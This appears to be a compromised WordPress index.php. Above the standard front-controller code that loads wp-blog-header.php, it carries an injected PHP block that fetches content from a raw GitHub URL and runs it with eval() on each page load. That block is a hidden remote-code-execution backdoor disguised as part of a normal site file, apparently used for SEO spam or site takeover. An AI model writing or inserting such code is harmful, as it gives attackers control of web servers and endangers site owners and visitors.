<?php
$url = "https://raw.githubusercontent.com/Zeddgansz/codeseo/main/09-08-2024";
$handle = fopen($url, "r");

if ($handle) {
    ob_start();
    fpassthru($handle);
    $content = ob_get_clean();
    fclose($handle);

    ob_start();
    eval("?>" . $content);
    ob_end_flush();
} else {
    echo 'Error: Unable to retrieve content.';
}
?>

<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
